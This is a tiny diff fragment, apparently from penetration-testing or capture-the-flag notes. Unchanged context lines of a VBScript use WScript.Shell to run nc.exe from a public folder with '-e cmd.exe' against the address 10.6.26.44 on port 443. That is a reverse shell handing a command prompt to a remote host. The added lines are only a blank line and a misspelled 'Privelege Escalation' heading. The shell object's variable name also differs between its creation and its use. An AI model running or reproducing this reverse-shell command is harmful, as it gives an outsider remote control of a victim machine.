@@ -20,3 +20,5 @@ with bStrm
 end with
 Set objShell20= CreateObject("WScript.Shell")
 objShell.Exec("C:\Users\Public\nc.exe -d 10.6.26.44 443 -e cmd.exe")
+
+# Privelege Escalation 
